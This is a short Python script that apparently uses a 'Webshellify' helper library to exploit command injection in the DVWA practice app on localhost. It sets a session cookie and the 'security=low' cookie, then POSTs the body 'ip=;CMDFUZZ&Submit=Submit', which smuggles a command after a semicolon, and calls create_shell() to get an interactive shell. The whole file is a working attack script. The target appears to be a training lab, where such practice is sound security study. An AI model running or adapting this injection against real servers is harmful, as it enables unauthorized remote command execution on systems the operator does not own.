#!/bin/python3
from webshellify import Webshellify

def main():
    shell = Webshellify("localhost", "vulnerabilities/exec/#")
    shell.set_cookie("PHPSESSID", "23rmt95ns3nnvl9jr7qee2a6s5")
    shell.set_cookie("security", "low")

    shell.set_method("POST")
    shell.set_header("Content-Type", "application/x-www-form-urlencoded")
    shell.set_body("ip=;CMDFUZZ&Submit=Submit")

    shell.create_shell()

if __name__ == "__main__":
    main()
